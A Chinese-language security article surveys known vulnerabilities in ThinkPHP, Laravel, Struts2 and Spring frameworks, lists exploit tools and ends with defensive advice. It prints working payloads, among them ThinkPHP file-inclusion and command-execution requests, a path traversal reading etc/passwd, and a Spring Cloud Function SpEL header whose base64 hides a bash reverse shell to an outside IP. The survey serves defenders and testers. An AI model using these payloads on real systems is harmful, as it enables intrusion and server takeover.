在当今的Web应用开发中，各类开发框架极大地提升了开发效率，但同时也引入了固有的安全风险。攻击者往往针对流行框架的历史漏洞进行自动化扫描和利用，从而导致数据泄露、服务器失陷等严重后果。本文将从理论与实践结合的角度，梳理PHP和Java两大生态中典型框架的高危漏洞，并给出对应的检测方法与利用工具，最后总结框架安全的最佳实践。

一、PHP框架的安全隐患

1. ThinkPHP —— 轻量级框架的典型漏洞

ThinkPHP是国内使用最广泛的PHP框架之一，其历史版本中存在多个高危漏洞。

（1）版本6.x 文件包含漏洞（6.0.13及以前）
在特定版本中，攻击者可以通过构造恶意请求触发文件包含，进而执行任意代码。利用方式如下：

```
/?+config-create+/&lang=../../../../../../../../../../../usr/local/lib/php/pearcmd&/<?=phpinfo()?>+shell.php
```

该漏洞利用了Pearcmd.php的包含机制，结合lang参数进行路径穿越，最终写入恶意文件并执行。实际利用时，可将phpinfo()替换为WebShell代码。

（2）版本5.x 命令执行漏洞（5.0.22/5.1.29等）
ThinkPHP 5.x早期版本存在未过滤的控制器名参数，导致远程命令执行。常见Payload为：

```
?s=index/think\app/invokefunction&function=call_user_func_array&vars[0]=system&vars[1][]=whoami
```

检测工具方面，可使用集成化的ThinkPHP专用扫描工具（如“武器库-Thinkphp专检”）快速检测3~6版本的相关漏洞。

2. Laravel —— 优雅框架的RCE链（CVE-2021-3129）

Laravel ≤ 8.4.2版本存在一处反序列化漏洞，攻击者可利用Ignition组件的makeView参数触发Phar反序列化，最终执行任意代码。利用该漏洞需要开启APP_DEBUG模式。

利用工具：

· zhzyker/CVE-2021-3129
· SecPros-Team/laravel-CVE-2021-3129-EXP

实践时，需先获取Laravel应用的.env文件或确定版本，然后使用工具生成恶意日志文件并触发反序列化。

二、Java框架的复杂攻击面

Java框架在企业级应用中占据主导地位，Struts2和Spring家族的漏洞层出不穷。

1. Struts2 —— 老牌框架的漏洞集合

Apache Struts2历史上爆出过多次严重RCE漏洞（如S2-045、S2-046、S2-057等）。由于漏洞种类繁多，手工检测较为繁琐，推荐使用集成化扫描工具：

· abc123info/Struts2VulsScanTools

该工具可批量检测常见Struts2漏洞，并支持命令执行验证。

2. Spring全家桶的连环洞

（1）Spring Core RCE（CVE-2022-22965）
该漏洞被称为“Spring4Shell”，影响JDK 9.0及以上版本的Spring框架及衍生框架。攻击者通过构造POST请求，利用classLoader等参数实现任意文件写入，进而部署WebShell。

· 利用工具：wjl110/CVE-2022-22965_Spring_Core_RCE

（2）Spring Boot 目录遍历（CVE-2021-21234）
spring-boot-actuator-logview组件在0.2.13之前版本存在路径遍历漏洞，允许攻击者读取任意文件。例如：

```
/manage/log/view?filename=etc/passwd&base=../../../../../
```

若应用开启了logview端点且未升级，攻击者可轻松读取系统敏感文件。

（3）Spring Cloud Function SpEL注入（CVE-2022-22963）
Spring Cloud Function 3.0.0.RELEASE至3.2.2版本中，由于对请求头中的spring.cloud.function.routing-expression未做有效过滤，导致SpEL表达式注入，可直接执行任意命令。

```http
POST /functionRouter HTTP/1.1
Content-Type: application/json

spring.cloud.function.routing-expression: T(java.lang.Runtime).getRuntime().exec("bash -c {echo,YmFzaCAtaSA+JiAvZGV2L3RjcC80Ny45NC4yMzYuMTE3LzU1NjYgMD4mMQ==}|{base64,-d}|{bash,-i}")
```

该漏洞常被用于反弹Shell，危害极大。

（4）Spring Cloud Gateway命令执行（CVE-2022-22947）
Spring Cloud Gateway 3.1.x < 3.1.1、3.0.x < 3.0.7版本中，Actuator端点开启时，攻击者可通过构造恶意路由定义实现SpEL代码执行，进而控制服务器。

（5）Actuator配置不当利用
Spring Boot Actuator提供了监控和管理能力，但若配置不当（如未合理限制端点访问），可能导致敏感信息泄露。典型利用链：

· 访问 /actuator 发现可用端点。
· 若存在 /actuator/heapdump，下载堆转储文件，使用工具（如heapdump_tool）分析其中的明文密码、密钥等。
· 进一步结合泄露的凭证登录其他后台或数据库。

综合利用工具：

· 0x727/SpringBootExploit —— 支持常见Spring漏洞的检测与利用。
· 13exp/SpringBoot-Scan-GUI —— 图形化扫描工具，方便快速检测。

三、Python框架的潜在风险（Flask/Django）

虽然本文主要聚焦PHP和Java，但Python框架同样存在大量安全问题。例如Flask的调试模式可能导致PIN码泄露，Django的SQL注入、反序列化等漏洞也屡见不鲜。实际攻防中，可关注框架公开的CVE及对应的利用手法。

四、框架漏洞挖掘思路与防护建议

1. 挖掘思路

· 信息收集：通过HTTP响应头、Cookie、特定路径（如/actuator/info）识别框架版本。
· 版本比对：对照公开漏洞库（如CVE Details、Exploit-DB）确认是否存在已知漏洞。
· 自动化扫描：使用上述工具进行批量检测，提高效率。
· 手工验证：对扫描结果进行复现，避免误报。

2. 防护建议

· 及时更新：保持框架及组件为最新稳定版本，避免使用已停止维护的版本。
· 最小化原则：关闭不必要的功能（如Actuator端点、Debug模式），若必须开启则添加严格的访问控制。
· 输入验证：对所有用户输入进行过滤和校验，防止路径遍历、表达式注入。
· 安全配置：修改默认路径、禁用危险函数（如eval、Runtime.exec的直接调用）。
· 定期审计：使用SAST/DAST工具对代码进行安全扫描，发现潜在问题。

五、结语

开发框架在简化开发的同时也引入了标准化的攻击面。攻击者只需一次漏洞利用，就可能获得服务器的控制权。作为防御者，必须深入理解框架的运行机制和漏洞原理，结合自动化工具与手工审计，构建多层次的安全防护体系。本文所列举的漏洞仅为冰山一角，实际攻防中需持续关注新披露的漏洞，并快速响应，方能立于不败之地。

---

参考资料：

· ThinkPHP 6.x 文件包含漏洞分析
· Laravel CVE-2021-3129 技术细节
· Spring官方安全公告
· 各漏洞对应GitHub利用工具
